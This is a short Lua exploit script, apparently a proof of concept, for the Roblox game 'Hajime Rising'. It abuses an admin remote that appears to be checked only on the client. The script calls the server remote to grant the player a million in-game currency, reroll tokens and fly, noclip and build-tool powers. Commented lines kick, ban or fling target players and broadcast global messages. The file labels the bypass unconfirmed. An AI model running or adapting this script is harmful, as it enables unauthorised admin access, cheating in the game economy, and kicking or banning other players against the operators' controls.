--[[
Hajime Rising [ALPHA] — Admin Permission Bypass PoC
UNCONFIRMED server-side: AdminPanelController gates buttons client-side via
table.find(v80, permission), but AdminPanelRemote:InvokeServer("GiveYen", ...) etc.
can be invoked by ANY client if the server does not re-verify the caller's role.

Actions: GiveYen, GiveRerolls, Fly, Noclip, BTools, Fling, Kick, Ban,
StatEvent, ServerMessage, GlobalMessage.
--]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local AdminPanelRemote = ReplicatedStorage:WaitForChild("Boxing"):WaitForChild("AdminPanelRemote")

local function ask(action, ...)
    local ok, a, b = pcall(function()
        return AdminPanelRemote:InvokeServer(action, ...)
    end)
    print(string.format("[AdminPanel] %s -> ok=%s result=%s msg=%s",
        action, tostring(ok), tostring(a), tostring(b)))
    return ok, a, b
end

-- Give yourself yen (UNCONFIRMED)
ask("GiveYen", LocalPlayer.UserId, 1000000)
-- Give yourself reroll tokens (UNCONFIRMED)
ask("GiveRerolls", LocalPlayer.UserId, 100)
-- Admin powers (UNCONFIRMED)
ask("Fly", true)
ask("Noclip", true)
ask("BTools", true)   -- unlocks AdminBuildTools move/clone/delete gun
-- Targeted actions (UNCONFIRMED; replace userId with a target)
-- ask("Fling", targetUserId)
-- ask("Kick", targetUserId)
-- ask("Ban", targetUserId, 86400, "1 day")
-- ask("StatEvent", true)          -- toggle x2 stats event
-- ask("ServerMessage", "test")
-- ask("GlobalMessage", "test")    -- all servers
